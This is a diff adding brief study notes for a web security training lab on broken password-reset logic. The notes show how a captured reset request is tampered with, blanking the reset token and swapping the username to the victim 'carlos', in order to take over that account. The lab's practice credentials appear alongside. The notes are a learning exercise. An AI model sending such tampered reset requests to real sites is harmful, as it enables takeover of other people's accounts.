@@ -1,0 +1,19 @@
+Lab #3 - Password reset broken logic
+
+End goal: 
+- Reset password of Carlos
+- Access "My account" page of carlos
+
+Your credentials: wiener:peter
+Victim's username: carlos
+
+Analysis:
+
+temp-forgot-password-token=azzn3rl1z4c8jwbw2rcbaw6zwxhbffi5
+
+==> temp-forgot-password-token=x
+
+
+temp-forgot-password-token=azzn3rl1z4c8jwbw2rcbaw6zwxhbffi5&username=wiener&new-password-1=new&new-password-2=new
+
+==> temp-forgot-password-token=x&username=carlos&new-password-1=new&new-password-2=new
